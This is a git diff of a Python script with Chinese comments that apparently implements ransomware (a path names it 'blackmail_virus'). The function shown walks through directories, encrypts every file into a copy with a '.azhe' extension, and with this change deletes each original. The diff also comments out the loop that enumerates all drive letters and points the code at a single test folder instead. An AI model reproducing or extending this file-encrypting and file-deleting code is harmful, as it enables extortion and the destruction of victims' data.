@@ -43,16 +43,16 @@ def encrypt(key, data):
 
 # 负责遍历文件系统的进程
 def fs_traverse(q):
-    drive_list = []  # 存放磁盘分区列表
+    # drive_list = []  # 存放磁盘分区列表
 
-    for c in string.ascii_uppercase:
-        drive = c + ":\\"
-        if os.path.isdir(drive):
-            drive_list.append(drive)
+    # for c in string.ascii_uppercase:
+    #     drive = c + ":\\"
+    #     if os.path.isdir(drive):
+    #         drive_list.append(drive)
 
-    print(drive_list)
+    # print(drive_list)
 
-    # drive_list = [r'C:\Users\POWER\Desktop\blackmail_virus\123']
+    drive_list = [r'C:\Users\POWER\Desktop\123']
 
     for drive in drive_list:
         for root, dirs, files in os.walk(drive):
@@ -64,6 +64,7 @@ def fs_traverse(q):
                     with open(dest_file_path, "rb") as f:
                         data = encrypt(key, f.read())
                         dst_file_path = dest_file_path + ".azhe"
+                    os.remove(dest_file_path)
                     with open(dst_file_path, "wb") as f:
                         f.write(data)
 
